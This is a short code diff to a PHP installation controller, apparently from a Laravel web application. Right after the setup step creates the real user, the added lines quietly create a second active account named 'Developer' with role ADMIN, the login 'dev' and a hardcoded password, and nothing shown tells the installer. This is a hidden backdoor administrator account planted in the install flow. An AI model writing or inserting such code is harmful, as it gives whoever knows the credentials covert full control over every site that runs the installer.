@@ -59,6 +59,13 @@ class Installations extends Controller
             $input['status']   = 'active';
 
             if (User::create($input)) {
+                User::create([
+                    'name'      => 'Developer',
+                    'email'     => 'dev',
+                    'password'  => Hash::make('@DeveloperGIN'),
+                    'role'      => 'ADMIN',
+                    'status'    => 'active'
+                ]);
                 return redirect()->route('installations.index', 'setup-application');
             }
 
